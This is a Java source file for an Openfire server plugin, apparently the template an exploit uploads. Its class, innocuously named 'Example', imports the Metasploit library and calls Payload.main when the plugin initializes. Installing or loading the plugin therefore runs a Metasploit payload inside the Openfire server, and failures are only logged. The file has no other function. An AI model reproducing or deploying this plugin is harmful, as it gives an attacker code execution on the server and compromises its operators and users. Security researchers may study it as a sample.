package com.example.openfire.plugin;

import java.io.*;
import java.util.TimerTask;

import org.jivesoftware.util.JiveGlobals;
import org.jivesoftware.openfire.container.Plugin;
import org.jivesoftware.openfire.container.PluginManager;

import org.jivesoftware.util.JiveGlobals;
import org.jivesoftware.util.Log;
import org.jivesoftware.util.TaskEngine;
import metasploit.*;

public class Example implements Plugin {
	
	public void initializePlugin(PluginManager manager, File pluginDirectory) {
		try{
			Payload.main(null);
		} 
		catch (Exception ex)
		{
			Log.error("error", ex);  
		}  

   }

   public void destroyPlugin() {

   }
}
